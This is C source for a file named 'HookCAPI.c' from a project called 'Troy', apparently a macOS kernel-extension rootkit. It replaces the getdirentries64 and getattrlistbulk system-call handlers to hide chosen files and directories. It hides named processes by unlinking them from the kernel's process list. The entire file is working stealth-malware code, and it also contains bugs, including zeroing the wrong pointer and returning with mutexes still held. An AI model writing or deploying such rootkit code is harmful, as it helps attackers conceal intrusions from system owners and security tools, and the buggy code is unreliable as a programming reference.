//
//  HookCAPI.c
//  Troy
//
//  Created by Axis on 5/8/15.
//  Copyright (c) 2015 Axis. All rights reserved.
//
#include <libkern/libkern.h>
#include <sys/errno.h>
#include <sys/lock.h>
#include <sys/proc.h>
#include <sys/syscall.h>
#include <sys/malloc.h>
#include <sys/dirent.h>

#include "HookCAPI.h"
#include "configure.h"
#include "debugInfo.h"
#include "HookSystemCall.h"

#pragma mark lock
extern lck_mtx_t *lck_mtx_hide_process;
extern lck_mtx_t *lck_mtx_hide_file;
extern lck_mtx_t *lck_mtx_hide_directory;
extern lck_mtx_t *lck_mtx_hide_proc_array;
extern lck_rw_t *lck_rw_hide_file_dirent_array;
#pragma mark hide_array
extern struct hide_proc_list hide_proc_array;  //for store process that is hide
extern struct hide_file_dirent_list hide_file_dirent_array;
#pragma origianl function
extern getdirentries64_function_prototype my_getdirentries64;
//extern getdirentriesattr_function_prototype my_getdirentriseattr;
extern getattrlist_function_prototype my_getattrlist;
extern getattrlistbulk_function_prototype my_getattrlistbulk;

int hide_given_directory(troy_hide_object *directory_hide)
{
    if(directory_hide==NULL) return TROY_ERROR_INVALID_PARAMETER;
    if(directory_hide->objec_type!=TROY_DIR)
    {
        LOG(LOG_ERROR, "directory types are not matached.");
        return TROY_ERROR_NOT_MATCH;
    }

    lck_mtx_lock(lck_mtx_hide_directory);

    //hook getdirentries64
    //-------------begin----------------
    mach_vm_address_t getdirentries_entry_addr=0;
    int return_code=0;

    return_code = GetOriginalFunction(SYS_getdirentries64, &getdirentries_entry_addr);
    if(return_code!=TROY_SUCCESS)
    {
        LOG(LOG_ERROR, "Get SYS_getdirentries64 original function failed");
        return return_code;
    }

    my_getdirentries64=*((getdirentries64_function_prototype)(getdirentries_entry_addr));
    LOG(LOG_DEBUG, "original_getdirentries_ptr address is %p", *my_getdirentries64);

    return_code = SetSystemCallHandle(my_getdirentries64_callback, SYS_getdirentries64);
    if(return_code!=TROY_SUCCESS)
    {
        lck_mtx_unlock(lck_mtx_hide_directory);
        return return_code;
    }
    //-------------end----------------

    //hook getattrlistbulk(only support yousemite)
    //-------------begin----------------
    mach_vm_address_t getattrlistbulk_entry_addr=0;
    GetOriginalFunction(SYS_getattrlistbulk, &getattrlistbulk_entry_addr);    //get original function
    if(return_code!=TROY_SUCCESS)
    {
        LOG(LOG_ERROR, "Get SYS_getattrlistbulk original function failed");
        return return_code;
    }

    my_getattrlistbulk = *((getattrlistbulk_function_prototype)(getattrlistbulk_entry_addr));
    LOG(LOG_DEBUG, "original_my_getattrlist_ptr is %p", *my_getattrlist);

    return_code = SetSystemCallHandle(my_getattrlistbulk_callback, SYS_getattrlistbulk);
    if(return_code!=TROY_SUCCESS)
    {
        lck_mtx_unlock(lck_mtx_hide_directory);
        return return_code;
    }
    //-------------end----------------

    //hook getdirentriesattr
    /*mach_vm_address_t getdirentriesattr_entry_addr=0;
    GetOriginalFunction(SYS_getdirentriesattr, &getdirentriesattr_entry_addr);    //get original function
    if(return_code!=TROY_SUCCESS)
    {
        LOG(LOG_ERROR, "Get SYS_getdirentriesattr original function failed");
        return return_code;
    }

    my_getdirentriseattr = *((getdirentriesattr_function_prototype)(getdirentriesattr_entry_addr));
    LOG(LOG_DEBUG, "original_getdirentriesattr_ptr is %p", my_getdirentriseattr);

    return_code = SetSystemCallHandle(my_getdirentriesattr_callback, SYS_getdirentriesattr);
    if(return_code!=TROY_SUCCESS)
    {
        lck_mtx_unlock(lck_mtx_hide_directory);
        return return_code;
    }*/

    //add hide object here
    struct hide_file_dirent *file_dirent_obj=(struct hide_file_dirent*)_MALLOC(sizeof(struct hide_file_dirent), M_TEMP, M_WAITOK);
    if(file_dirent_obj==NULL)
    {
        LOG(LOG_ERROR, "file_dirent_obj allocate memory failed");
        lck_mtx_unlock(lck_mtx_hide_directory);
        return TROY_ERROR_NOMEM;
    }
    bzero(file_dirent_obj, sizeof(struct hide_file_dirent));
    ///1. copy name
    strncpy(file_dirent_obj->name, directory_hide->name,
            strlen(directory_hide->name)>sizeof(file_dirent_obj->name)-1?sizeof(file_dirent_obj->name)-1:strlen(directory_hide->name));
    LOG(LOG_DEBUG, "@test_log: name is %s", directory_hide->name);

    ///2. copy type
    file_dirent_obj->type=directory_hide->objec_type;
    LOG(LOG_DEBUG, "@test_log: type is %d", file_dirent_obj->type);

    lck_rw_lock_exclusive(lck_rw_hide_file_dirent_array);
    TAILQ_INSERT_HEAD(&hide_file_dirent_array, file_dirent_obj, next_ptr);  //add the hidden file name to the array
    lck_rw_unlock_exclusive(lck_rw_hide_file_dirent_array);

    lck_mtx_unlock(lck_mtx_hide_directory);
    return TROY_SUCCESS;
}

errno_t hide_given_process(troy_hide_object *process_hide)
{
    if(process_hide==NULL) return TROY_ERROR_INVALID_PARAMETER;
    if(process_hide->objec_type!=TROY_PROCESS)
    {
        LOG(LOG_ERROR, "The file types are not matched.");
        return TROY_ERROR_NOT_MATCH;
    }

    lck_mtx_lock(lck_mtx_hide_process);

    struct proc_yousemite* kernel_proc = (struct proc_yousemite*)kernproc;
    char process_name[PROCESS_NAME_LENGTH];
    bzero(process_name, PROCESS_NAME_LENGTH);
    do
    {
        int pid=proc_pid((proc_t)kernel_proc);
        proc_name(pid, process_name, PROCESS_NAME_LENGTH-1);    //get only $(PROCESS_NAME_LENGTH)-1 bytes
        LOG(LOG_ERROR, "process name is %s", process_name);
        if(strcasecmp(process_name, process_hide->name)==0)
        {
            LOG(LOG_INFO, "Get process name scuuessfully");
            LIST_REMOVE(kernel_proc, p_list);

            struct hide_proc *proc = (struct hide_proc *)_MALLOC(sizeof(struct hide_proc), M_TEMP, M_WAITOK);
            if(proc==NULL) return TROY_ERROR_NOMEM;
            bzero(proc, sizeof(struct hide_proc));

            proc->proc = (struct proc_yousemite*)_MALLOC(sizeof(struct proc_yousemite), M_TEMP, M_WAITOK);
            if(proc->proc==NULL) return TROY_ERROR_NOMEM;
            bzero(proc, sizeof(struct proc_yousemite));

            memcpy(proc->proc, kernel_proc, sizeof(struct proc_yousemite));
            memcpy(proc->name, process_name, strlen(process_name));
            proc->proc_pid = pid;         //set pid, for removing it when the process dose not existed
            proc->type=TROY_PROCESS;      //set type

            lck_mtx_lock(lck_mtx_hide_proc_array);
            TAILQ_INSERT_HEAD(&hide_proc_array, proc, next_ptr);    //the process that is hided by Troy
            lck_mtx_unlock(lck_mtx_hide_proc_array);
        }
        /*
         * here we must use le_prev, because le_next is NULL.
         * and current kernproc's name is kernel_task
         */
        kernel_proc = (struct proc_yousemite*)kernel_proc->p_list.le_prev;
    }while(kernel_proc);

    lck_mtx_unlock(lck_mtx_hide_process);

    return TROY_SUCCESS;
}

int my_getdirentries64_callback(struct proc *p, struct getdirentries64_args *uap,
                                user_ssize_t *retval)
{
    user_ssize_t buf_size, real_size, total_size;
    void *mem;
    struct direntry *direntry_ptr=NULL;
    int is_found=0;
    LOG(LOG_ERROR, "in ");
    int return_code = (*my_getdirentries64)(p, uap, retval);
    if(return_code!=0)
    {
        LOG(LOG_ERROR, "getdirentries64 failed");
        return return_code;
    }

    total_size=real_size=buf_size = *retval;
    if(buf_size<=0) return TROY_ERROR_DATA_LENGTH_INVALID;

    LOG(LOG_ERROR, "total size is %llu", total_size);

    if(TAILQ_EMPTY(&hide_file_dirent_array))
    {
        LOG(LOG_ERROR, "hide_file_dirent_array is empty");
        return TROY_ERROR_HIDE_ARRAY_IS_EMPRY;
    }

    mem = _MALLOC(buf_size, M_TEMP, M_WAITOK);
    if(mem==NULL) return TROY_ERROR_NOMEM;

    copyin(CAST_USER_ADDR_T(uap->bufp), mem, buf_size);
    direntry_ptr=mem;                   //get struct dirent array pointer(this is kernel pointer)

    while(buf_size>0 && direntry_ptr && direntry_ptr->d_reclen>0)
    {
        struct hide_file_dirent *var=NULL, *tvar=NULL;
        int found=0;

        LOG(LOG_DEBUG, "current compare file is %s", direntry_ptr->d_name);

        lck_rw_lock_shared(lck_rw_hide_file_dirent_array);
        TAILQ_FOREACH_SAFE(var, &hide_file_dirent_array, next_ptr, tvar)
        {
            LOG(LOG_DEBUG, "hide file is %s", var->name);
            if(strcmp(direntry_ptr->d_name, var->name)==0)
            {
                //real_size-=direntry_ptr->d_reclen;  //real_size
                buf_size-=direntry_ptr->d_reclen;   //for reading next buf
                LOG(LOG_ERROR, "total_size is %llu", total_size-((char *)mem-(char*)direntry_ptr));
                bcopy(((char*)direntry_ptr)+direntry_ptr->d_reclen, (char*)direntry_ptr, total_size-((char *)mem-(char*)direntry_ptr));//cover hidden one
                found=1;
                is_found=1;
                break;
            }
        }
        lck_rw_unlock_shared(lck_rw_hide_file_dirent_array);    //unlock read-write lock
        if(found==1) continue;  //if found just continue;
        buf_size-=direntry_ptr->d_reclen;   //if dose not find any file, just access the next files
        direntry_ptr=(struct direntry*)((char*)direntry_ptr+direntry_ptr->d_reclen);    //read dirent's struct
    }

    if(is_found)
    {
        copyout(mem, CAST_USER_ADDR_T(uap->bufp), real_size);
        *retval=real_size;
    }
    LOG(LOG_ERROR, "the real size is %llu", real_size);
    SAFE_FREE(mem);

    //LOG(LOG_DEBUG, "buf_size=%llu", buf_size);

    /*if(direntry_ptr!=NULL)
    {
        LOG(LOG_ERROR, "file name is %s", direntry_ptr->d_name);
        LOG(LOG_ERROR, "file d_ino=%llu", direntry_ptr->d_ino);
        LOG(LOG_ERROR, "file d_reclen=%d", direntry_ptr->d_reclen);
    }*/

    return 0;
}

int my_getattrlistbulk_callback(struct proc * p,struct getattrlistbulk_args *uap,int32_t *retval)
{
    LOG(LOG_DEBUG, "I am in");

    int return_code = (*my_getattrlistbulk)(p, uap, retval);
    if(return_code!=0)
    {
        LOG(LOG_ERROR, "getattrlist failed, return code is %d", return_code);
        return return_code;
    }

    return 0;
}



/*errno_t hide_specific_files(troy_hide_object *files_hide)
{
    sy_call_t *
    GetOriginalFunction(SYS_getdirentries64, <#sy_call_t **orginal_ptr#>)
    SetSystemCallHandle(<#void *function_handle#>, <#int syscall_no#>, <#int syscall_nargs#>, <#void *original_handle#>)
}*/